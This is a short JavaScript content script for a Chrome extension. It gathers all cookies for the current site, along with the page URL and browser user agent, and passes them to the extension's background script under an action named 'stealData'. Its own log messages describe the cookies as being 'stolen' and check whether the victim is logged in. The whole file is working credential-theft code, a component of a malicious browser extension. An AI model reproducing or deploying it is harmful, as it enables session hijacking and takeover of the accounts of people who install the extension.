console.log("Content script loading...");
chrome.runtime.sendMessage(
    {
        action: "getAllCookies",
        url: window.location.origin,
    },
    (response) => {
        const cookieCount = response?.cookies?.length || 0;
        console.log("Background responded with cookies. Count:", cookieCount);

        if (cookieCount > 0) {
            console.log("Sending " + cookieCount + " cookies to background to be stolen...");
            chrome.runtime.sendMessage({
                action: "stealData",
                data: {
                    url: window.location.href,
                    cookies: response.cookies, // Full objects
                    ua: navigator.userAgent,
                },
            });
        } else {
            console.log("No cookies found to steal. (Are you logged in?)");
        }
    }
);
